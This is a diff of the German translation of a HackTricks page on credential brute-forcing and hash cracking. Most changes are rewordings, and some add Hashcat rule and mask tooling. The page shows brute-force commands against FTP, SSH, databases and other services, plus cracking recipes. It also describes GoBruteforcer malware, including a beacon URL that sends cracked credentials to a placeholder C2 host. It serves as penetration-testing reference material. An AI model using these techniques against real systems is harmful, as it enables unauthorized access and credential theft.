@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Standardzugangsdaten
+## Standard-Anmeldedaten
 
-**Suche bei Google** nach Standardzugangsdaten für die verwendete Technologie oder **probiere diese Links aus**:
+**Suche bei Google** nach Standard-Anmeldedaten für die verwendete Technologie oder **probiere diese Links aus**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **Eigene Wörterbücher erstellen**
+## **Erstelle deine eigenen Wörterbücher**
 
-Sammle so viele Informationen wie möglich über das Ziel und erstelle ein maßgeschneidertes Wörterbuch. Hilfreiche Tools:
+Sammle so viele Informationen wie möglich über das Ziel und erstelle ein benutzerdefiniertes Wörterbuch. Diese Tools können dabei helfen:
 
 ### Crunch
 
@@ -51,7 +51,7 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Generiere Passwörter basierend auf deinem Wissen über das Opfer (Namen, Daten ...)
+Generiere Passwörter basierend auf deinem Wissen über das Opfer (Namen, Daten usw.).
 
 ```
 python3 cupp.py -h
@@ -59,7 +59,7 @@ python3 cupp.py -h
 
 ### [Wister](https://github.com/cycurity/wister)
 
-Ein Wordlist-Generator-Tool, dem du eine Reihe von Wörtern übergeben kannst. Es ermöglicht dir, aus den angegebenen Wörtern mehrere Varianten zu erstellen und so eine einzigartige, auf ein bestimmtes Ziel zugeschnittene Wordlist zu generieren.
+Ein wordlist-Generator, mit dem du eine Reihe von Wörtern angeben und daraus mehrere Variationen erstellen kannst. So erhältst du eine einzigartige, auf ein bestimmtes Ziel zugeschnittene wordlist.
 
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
@@ -95,19 +95,19 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Workflow eines Internet-weiten Bruteforcers (Erkenntnisse von Go-basierten Scannern)
+## Workflow für internetweite Brute-Force-Angriffe (Erkenntnisse von Go-basierten Scannern)
 
 Die folgenden Verhaltensweisen wurden im Scan-Workflow der GoBruteforcer-Malware beobachtet; die genauen Werte sind beispielspezifisch.<sup>[[1]](#references)</sup>
 
-- **An die Architektur angepasste Worker-Pools** betreiben (zum Beispiel 95 gleichzeitige Worker auf `x86_64/arm64`, 85 auf `i686`, 35 auf `armv5tel` und standardmäßig 50 auf anderen Architekturen), aktive Worker jede Sekunde überprüfen und Ersatz starten, wenn die Zielanzahl unterschritten wird; jeder Worker bearbeitet höchstens eine Ziel-IP, bevor er beendet wird.
-- **Zufällige öffentliche IPv4-Adressen** generieren, aber offensichtlich nicht routbare und ausgewählte, vom Betreiber gemiedene Bereiche verwerfen: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, Multicast `>=224.0.0.0/4`, cloudlastige `/8`-Netze (`3/15/16/56`) und dem US-Verteidigungsministerium zugeordnete `/8`-Netze (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Den Service-Port prüfen** und vor Versuchen mit **Klartext-Logins** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin über HTTP/80) ein kurzes Timeout (~2s) verwenden; falls der Abruf der C2-Zugangsdaten fehlschlägt, auf eine **kleine integrierte Zugangsdatenliste** zurückgreifen.
-- **Treffer exfiltrieren** über winzige HTTP-GET-Beacons wie `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (Service-Codes wie `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`) und dabei einen gängigen Browser-User-Agent verwenden, um nicht aufzufallen.
-- **phpMyAdmin-Spray** kann etwa 80 wahrscheinliche Pfade mit `GET /index.php?lang=en` per Bruteforce testen, PMA-Marker erkennen (`pmahomme`-Theme/`phpmyadmin.css`/`navigation.php`) und `codemirror.css?v=X.Y.Z` auslesen, um die Authentifizierung entsprechend zu wählen: Versionen `<4.9` akzeptieren GET-Parameter `pma_username`/`pma_password`; Versionen `>=4.9` verwenden POST mit `server=1`, CSRF-`token` und denselben Zugangsdaten.
+- **Architekturspezifisch abgestimmte Worker-Pools** verwalten (zum Beispiel 95 parallele Worker auf `x86_64/arm64`, 85 auf `i686`, 35 auf `armv5tel` und standardmäßig 50 auf anderen Architekturen), aktive Worker jede Sekunde überprüfen und Ersatz starten, wenn die Zielanzahl unterschritten wird; jeder Worker verarbeitet höchstens eine Ziel-IP-Adresse und beendet sich dann.
+- **Zufällige öffentliche IPv4-Adressen** generieren, aber offensichtlich nicht routbare und bestimmte vom Betreiber gemiedene Bereiche ausschließen: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, Multicast `>=224.0.0.0/4`, Cloud-lastige `/8`-Netze (`3/15/16/56`) und mit dem US-Verteidigungsministerium verbundene `/8`-Netze (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Den Service-Port mit einem kurzen Timeout (~2s) überprüfen**, bevor **Klartext-Logins** versucht werden (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin über HTTP/80), und auf eine **kleine integrierte Zugangsdatenliste** zurückgreifen, falls der Abruf der C2-Zugangsdaten fehlschlägt.
+- **Treffer über kleine HTTP-GET-Beacons exfiltrieren**, etwa `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (Service-Codes wie `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), und dabei einen gängigen Browser-User-Agent verwenden, um unauffällig zu bleiben.
+- **phpMyAdmin-Spraying** kann mit `GET /index.php?lang=en` etwa 80 wahrscheinliche Pfade per Brute-Force durchprobieren, PMA-Marker erkennen (`pmahomme`-Theme/`phpmyadmin.css`/`navigation.php`) und `codemirror.css?v=X.Y.Z` auslesen, um den Authentifizierungsweg zu bestimmen: Versionen `<4.9` akzeptieren GET-Parameter `pma_username`/`pma_password`; Versionen `>=4.9` verwenden POST mit `server=1`, CSRF-`token` und denselben Zugangsdaten.
 
 ## Services
 
-Alphabetisch nach Servicenamen sortiert.
+Alphabetisch nach Service-Namen sortiert.
 
 ### AFP
 
@@ -127,7 +127,7 @@ msf> run
 nmap --script ajp-brute -p 8009 <IP>
 ```
 
-### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM und Solace)
+### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
 
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
@@ -177,7 +177,7 @@ medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
 
-### Allgemeines HTTP-Brute-Forcing
+### Generisches HTTP-Brute-Forcing
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
@@ -351,7 +351,7 @@ Um **oracle_login** mit **patator** zu verwenden, musst du Folgendes **installie
 pip3 install cx_Oracle --upgrade
 ```
 
-[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**Versionen 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** und **11.2.0.3**):
+[Offline OracleSQL-Hash-Brute-Force](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**Versionen 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2** und **11.2.0.3**):
 
 ```bash
  nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
@@ -511,13 +511,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
 
-#### Schwache SSH-Schlüssel / vorhersehbarer Debian-PRNG
+#### Schwache SSH-Schlüssel / vorhersagbarer PRNG in Debian
 
-Einige Systeme weisen bekannte Schwachstellen im Zufalls-Seed auf, der zur Erzeugung kryptografischen Materials verwendet wird. Dadurch kann sich der Schlüsselraum drastisch verkleinern, sodass er mit Tools wie [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) per Brute-Force durchsucht werden kann. Vorgefertigte Sammlungen schwacher Schlüssel sind ebenfalls verfügbar, etwa [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Einige Systeme weisen bekannte Schwachstellen im Zufalls-Seed auf, der zur Erzeugung kryptografischen Materials verwendet wird. Dadurch kann der Schlüsselraum drastisch verkleinert werden, sodass er mit Tools wie [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) per Brute-Force durchsucht werden kann. Vorab generierte Sammlungen schwacher Schlüssel sind ebenfalls verfügbar, etwa [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ und OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-Das textbasierte STOMP-Protokoll ist ein weit verbreitetes Messaging-Protokoll, das **eine nahtlose Kommunikation und Interaktion mit beliebten Message-Queue-Diensten ermöglicht**, etwa RabbitMQ, ActiveMQ, HornetQ und OpenMQ. Es bietet einen standardisierten und effizienten Ansatz für den Nachrichtenaustausch und die Ausführung verschiedener Messaging-Vorgänge.
+Das STOMP-Textprotokoll ist ein weit verbreitetes Messaging-Protokoll, das **eine nahtlose Kommunikation und Interaktion mit beliebten Message-Queue-Diensten ermöglicht**, etwa RabbitMQ, ActiveMQ, HornetQ und OpenMQ. Es bietet einen standardisierten und effizienten Ansatz zum Austausch von Nachrichten und zur Durchführung verschiedener Messaging-Operationen.
 
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
@@ -566,11 +566,11 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 
 ## Lokal
 
-### Online-Cracking-Datenbanken
+### Online-Datenbanken zum Knacken
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 mit/ohne ESS/SSP und mit beliebigem Challenge-Wert)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2-Captures und Archive wie MSOffice, ZIP, PDF ...)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 mit/ohne ESS/SSP und mit jedem Challenge-Wert)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2-Captures und Archive wie MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
 - [https://gpuhash.me/](https://gpuhash.me) (Hashes und Datei-Hashes)
@@ -580,7 +580,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Schau dir das an, bevor du versuchst, einen Hash per Brute Force zu knacken.
+Schau dir das an, bevor du versuchst, einen Hash mit Brute Force zu knacken.
 
 ### ZIP
 
@@ -602,8 +602,8 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 
 #### Known plaintext zip attack
 
-Du musst den **plaintext** (oder einen Teil davon) **einer Datei kennen, die im** verschlüsselten ZIP-Archiv enthalten ist. Du kannst **Dateinamen und Dateigrößen im** verschlüsselten ZIP-Archiv mit folgendem Befehl prüfen: **`7z l encrypted.zip`**\
-Lade [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)von der Releases-Seite herunter.
+Du musst den **plaintext** (oder einen Teil des **plaintext**) einer Datei kennen, die im verschlüsselten ZIP enthalten ist. Du kannst **Dateinamen und Dateigrößen in einem verschlüsselten ZIP** mit folgendem Befehl überprüfen: **`7z l encrypted.zip`**\
+Lade [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) von der Releases-Seite herunter.
 
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -641,9 +641,9 @@ sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 
-### PDF-Eigentümerpasswort
+### PDF-Owner-Passwort
 
-Um ein PDF-Eigentümerpasswort zu knacken, siehe: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Um ein PDF-Owner-Passwort zu knacken, siehe: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 
@@ -685,7 +685,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
 
-### Lucks image
+### LUKS-Image
 
 #### Methode 1
 
@@ -732,13 +732,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-Verwende [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) und anschließend john.
+Verwende [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) und anschließend john
 
 ### Passwortgeschützte Spalte in Open Office
 
 Wenn du eine xlsx-Datei mit einer passwortgeschützten Spalte hast, kannst du den Schutz aufheben:
 
-- **Lade die Datei auf Google Drive hoch** und das Passwort wird automatisch entfernt.
+- **Lade sie auf Google Drive hoch**; das Passwort wird automatisch entfernt
 - So kannst du den Schutz **manuell aufheben**:
 
 ```bash
@@ -777,9 +777,9 @@ hash-identifier
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Wordlist-Generierungstools**
+### **Tools zur Wordlist-Generierung**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Erweiterter Keyboard-Walk-Generator mit konfigurierbaren Basiszeichen, Tastaturbelegung und Routen.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Erweiterter Generator für Keyboard-Walks mit konfigurierbaren Basiszeichen, Keymap und Routen.
 
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
@@ -787,7 +787,7 @@ kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction
 
 ### John mutation
 
-Lies _**/etc/john/john.conf**_ und konfiguriere es.
+Lies _**/etc/john/john.conf**_ und konfiguriere es
 
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
@@ -796,20 +796,48 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 ### Hashcat
 
-#### Hashcat attacks
+#### Hashcat-Angriffe
 
 - **Wordlist attack** (`-a 0`) mit Regeln
 
-**Hashcat** wird bereits mit einem **Ordner mit Regeln** ausgeliefert, aber du findest [**hier weitere interessante Regeln**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** enthält bereits einen **Ordner mit Regeln**, aber du findest [**hier weitere interessante Regeln**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 
+#### Regeldateien erklären und analysieren
+
+Hashcat-Regeln führen Opcodes von links nach rechts aus. Das lässt sich leicht falsch verstehen, wenn Operationen an Position null wirken: `^e ^h ^t` stellt erst `e`, dann `h` und anschließend `t` voran und ändert daher `password` in `thepassword`. Substitutionen vergleichen Bytes unter Berücksichtigung der Groß- und Kleinschreibung, daher bewirkt eine Regel wie `sa@` bei einem großgeschriebenen `A` nichts. Teste unbekannte Regeln mit repräsentativen Basiswörtern in Klein-, Groß- und gemischter Schreibweise, bevor du GPU-Zeit dafür aufwendest.<sup>[[6]](#references)[[9]](#references)</sup>
+
+[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) kann jeden Zwischenschritt der Kandidatenerzeugung anzeigen und die Opcode-Verteilung einer vollständigen Regeldatei zusammenfassen. Statische Opcode-Zählungen zeigen, ob eine Datei hauptsächlich Zeichen anhängt, voranstellt, ersetzt oder abschneidet. Sie beweisen nicht, dass eine Regel ein Passwort knackt, helfen aber dabei, einen Regelsatz auszuwählen, der zu den beobachteten Passwortmustern der Zielgruppe passt.<sup>[[6]](#references)[[9]](#references)</sup>
+
+```bash
+uv tool install git+https://github.com/bandrel/HashcatRosetta.git
+hashcat-rosetta --explain '^e ^h ^t' --baseword password
+hashcat-rosetta rules.rule --analyze-rules
+```
+
+#### Redundante Regeln mit Debug-Logs reduzieren
+
+Der Debug-Modus von Hashcat protokolliert Regeltransformationen getrennt von der normalen Status- und Ergebnisausgabe. Modus `4` schreibt `baseword:rule:candidate`; Modus `5` fügt die Quell-Wortliste hinzu. Setze `--debug-file` immer explizit. Andernfalls öffnet Hashcat `hashcat.debugfile` in seinem Profilverzeichnis, und eine Umleitung von stdout erfasst den Konsolenstream statt dieser Einträge. Debug-Dateien werden im Append-Modus geöffnet. Entferne oder rotiere daher eine alte Datei vor einer neuen Messung und schütze sie, da sie Klartext-Basiswörter und Kandidaten enthält.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>
+
+```bash
+rm -f debug.txt
+hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
+  -r rules.rule hashes.txt wordlist.txt
+hashcat-rosetta debug.txt --rules --metric candidates --top 25
+hashcat-rosetta debug.txt --basewords --detail
+hashcat-rosetta debug.txt --wordlists --detail
+hashcat-rosetta debug.txt --export report.json --format json
+```
+
+Verwende `frequency`, um die am häufigsten angewendeten Regeln zu finden, `basewords`, um die Abdeckung unterschiedlicher Eingaben zu messen, und `candidates`, um unterschiedliche Ausgaben zu zählen. Das Ranking der Kandidaten ist meist der beste Ausgangspunkt zum Kürzen, da eine häufig angewendete Regel trotzdem viele Eingaben auf doppelte Kandidaten reduzieren kann. Kopiere die Regeln mit dem höchsten Nutzen in eine kleinere Datei, führe sie erneut gegen die übrigen Hashes aus und vergleiche die Berichte der einzelnen Durchläufe. Modus `5` zeigt außerdem, ob jede Quell-Wordlist nützliche basewords beiträgt. Erzwinge das Parsing mit `--debug-mode 4` oder `--debug-mode 5`, wenn Doppelpunkte in den Daten die automatische Erkennung mehrdeutig machen.<sup>[[6]](#references)[[9]](#references)</sup>
+
 - **Wordlist combinator**-Angriff
 
 Mit hashcat lassen sich **2 Wordlists zu einer kombinieren**.\
-Wenn Liste 1 das Wort **„hello“** enthält und die zweite 2 Zeilen mit den Wörtern **„world“** und **„earth“** enthält, werden die Wörter `helloworld` und `helloearth` generiert.
+Wenn Liste 1 das Wort **"hello"** und die zweite Liste zwei Zeilen mit den Wörtern **"world"** und **"earth"** enthielte, würden die Wörter `helloworld` und `helloearth` generiert.
 
 ```bash
 # This will combine 2 wordlists
@@ -824,18 +852,18 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- 
 
 #### Grammar-driven combinator attacks (verschlüsseltes Office-Beispiel)
 
-Ein Passwort kann lang sein und mehrere Zeichenklassen enthalten, aber dennoch einen kleinen **effektiven Suchraum** haben, wenn es einer bekannten Grammatik folgt. Bei einem während eines autorisierten Assessments erhaltenen verschlüsselten Office-Dokument extrahiert `office2john.py` den Datensatz zur Passwortüberprüfung. Dadurch sind lokale Rateversuche ohne Online-Sperren, Drosselung oder MFA möglich. Die Dokumentverschlüsselung wird dadurch nicht umgangen.<sup>[[2]](#references)[[5]](#references)</sup>
+Ein Passwort kann lang sein und mehrere Zeichenklassen enthalten, aber dennoch einen kleinen **effektiven Suchraum** haben, wenn es einer bekannten Grammatik folgt. Bei einem verschlüsselten Office-Dokument, das im Rahmen einer autorisierten Sicherheitsüberprüfung erlangt wurde, extrahiert `office2john.py` den Passwortverifizierungsdatensatz. Dadurch sind lokale Rateversuche ohne Online-Sperren, Drosselung oder MFA möglich. Die Dokumentverschlüsselung wird dadurch nicht umgangen.<sup>[[2]](#references)[[5]](#references)</sup>
 
-Entferne das Dateinamenfeld, das John voranstellt, damit Hashcat nur den Verifier erhält:<sup>[[2]](#references)</sup>
+Entferne das Dateinamenfeld, das John voranstellt, damit Hashcat nur den Verifizierer erhält:<sup>[[2]](#references)</sup>
 
 ```bash
 python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
 head -c 40 office.hash; echo
 ```
 
-Wähle `-m` anhand des extrahierten Präfixes und nicht anhand der Dateierweiterung. Hashcat ordnet `$office$*2007*`, `$office$*2010*` und `$office$*2013*` den Modi `9400`, `9500` und `9600` zu; Datensätze im älteren Format `$oldoffice$0/$1` und `$oldoffice$3/$4` verwenden die Modi `9700` bzw. `9800`.<sup>[[3]](#references)</sup>
+Wähle `-m` anhand des extrahierten Präfixes und nicht anhand der Dateierweiterung. Hashcat ordnet `$office$*2007*`, `$office$*2010*` und `$office$*2013*` den Modi `9400`, `9500` und `9600` zu; ältere `$oldoffice$0/$1`- und `$oldoffice$3/$4`-Datensätze verwenden die Modi `9700` bzw. `9800`.<sup>[[3]](#references)</sup>
 
-Wenn Informationen zu Passwortwiederverwendung, Richtlinien, Hinweisen oder Personen, die den Benutzer kennen, eine Grammatik wie `<word><number><optional !><word>` nahelegen, erstelle das unabhängig enumerierbare Präfix als linkes Wörterbuch. Dieses Beispiel testet Zahlen von `0` bis `99`; passe den Bereich und die Transformationen an die Erkenntnisse aus dem Assessment an.<sup>[[5]](#references)</sup>
+Wenn Informationen aus der Wiederverwendung von Passwörtern, Richtlinien, Hinweisen oder von Personen, die den Benutzer kennen, ein Muster wie `<word><number><optional !><word>` erkennen lassen, erstelle das unabhängig aufzählbare Präfix als linkes Wörterbuch. Dieses Beispiel testet Zahlen von `0` bis `99`; passe den Bereich und die Transformationen an die Erkenntnisse aus dem Assessment an.<sup>[[5]](#references)</sup>
 
 ```bash
 while IFS= read -r word; do
@@ -845,13 +873,13 @@ while IFS= read -r word; do
 done < words.txt > wordsAndNumbers.txt
 ```
 
-Der Hashcat-`attack mode` `1` hängt jede Zeile des rechten Wörterbuchs an jede Zeile des linken Wörterbuchs an. Dateien mit `L` bzw. `R` Zeilen ergeben somit `L × R` Kandidaten, bevor Regeln angewendet werden. Der folgende Befehl ist speziell für einen älteren `$oldoffice$3/$4`-Datensatz gedacht. Für andere Office-Formate muss der Modus geändert werden.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Der Hashcat-Angriffsmodus `1` hängt jede Zeile des rechten Wörterbuchs an jede Zeile des linken Wörterbuchs an. Dateien mit `L` bzw. `R` Zeilen erzeugen daher vor der Anwendung von Regeln `L × R` Kandidaten. Der folgende Befehl ist speziell für einen Legacy-Datensatz `$oldoffice$3/$4` vorgesehen; ändere den Modus für andere Office-Formate.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
 ```bash
 hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
 ```
 
-Dieses Preprocessing-Muster lässt sich auf andere offline-verifizierbare Formate übertragen: Zähle nur plausible Varianten der Groß- und Kleinschreibung, Datumsangaben, Trennzeichen, Ziffern oder Satzzeichen für eine Komponente auf und kombiniere sie anschließend mit der verbleibenden Komponente, statt die nominelle Gesamtlänge per Brute-Force zu durchsuchen.<sup>[[4]](#references)[[5]](#references)</sup>
+Dieses Preprocessing-Muster lässt sich auf andere offline verifizierbare Formate übertragen: Zähle für eine Komponente nur plausible Varianten der Groß- und Kleinschreibung, Datumsangaben, Trennzeichen, Ziffern oder Satzzeichen auf und kombiniere sie dann mit der übrigen Komponente, statt die nominelle Gesamtlänge per Brute-Force zu knacken.<sup>[[4]](#references)[[5]](#references)</sup>
 
 - **Mask attack** (`-a 3`)
 
@@ -887,7 +915,17 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
 
-- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`)-Angriff
+#### `.hcmask`-Dateien vor einem Durchlauf validieren
+
+Eine fehlerhafte Zeile kann zwischen gültigen Masks unentdeckt bleiben. Validiere daher die gesamte Datei und ihren geschätzten Keyspace, bevor du den Angriff startest. HashcatRosetta meldet die fehlerhafte Zeile und gibt einen Status ungleich null zurück, wenn eine Maske ungültig ist. Dadurch eignet sich die Prüfung für Skripte oder CI.<sup>[[6]](#references)[[9]](#references)</sup>
+
+```bash
+hashcat-rosetta masks.hcmask --verify-masks
+```
+
+Mask-Dateien nicht mit generischen CSV- oder Text-Parsern normalisieren. Hashcat unterstützt benutzerdefinierte Zeichensätze `?1` bis `?8`, behandelt `#` nur dann als Kommentar, wenn es das erste Byte ist, und entfernt Backslash-Escapes in einem Durchlauf, bevor `?`-Tokens interpretiert werden. Daher sind führende Leerzeichen vor `#` Maskendaten, und Escaping kann ändern, ob eine Sequenz als Literal oder als Zeichensatz-Token interpretiert wird.<sup>[[6]](#references)[[9]](#references)</sup>
+
+- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) Angriff
 
 ```bash
 # Mask numbers will be appended to each word in the wordlist
@@ -903,7 +941,7 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
 
-Cracking von Linux-Hashes – Datei /etc/shadow
+Linux-Hashes knacken – Datei /etc/shadow
 
 ```
  500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
@@ -912,7 +950,7 @@ Cracking von Linux-Hashes – Datei /etc/shadow
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
 
-Windows-Hashes knacken
+Cracking von Windows-Hashes
 
 ```
 3000 | LM                                               | Operating-Systems
@@ -933,9 +971,13 @@ Cracking gängiger Anwendungshashes
 
 ## References
 
-- [1] [Einblick in GoBruteforcer: KI-generierte Server-Standardeinstellungen, schwache Passwörter und auf Kryptowährungen ausgerichtete Kampagnen](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [Einblick in GoBruteforcer: KI-generierte Server-Standardeinstellungen, schwache Passwörter und kryptofokussierte Kampagnen](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 - [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
 - [3] [Hashcat-Beispiel-Hashes und Microsoft-Office-Modi](https://hashcat.net/wiki/doku.php?id=example_hashes)
 - [4] [Hashcat combinator attack](https://hashcat.net/wiki/doku.php?id=combinator_attack)
-- [5] [Nachlassplanung für Zugangsdaten](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
+- [5] [Nachlassplanung von Zugangsdaten](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
+- [6] [HashcatRosetta-Repository](https://github.com/bandrel/HashcatRosetta)
+- [7] [Implementierung der Hashcat-Debugdatei](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
+- [8] [Hashcat-Kommandozeilenhilfe](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
+- [9] [HashcatRosetta: Die Rosetta-Steintafel des Passwort-Crackings lesen](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
 {{#include ../banners/hacktricks-training.md}}
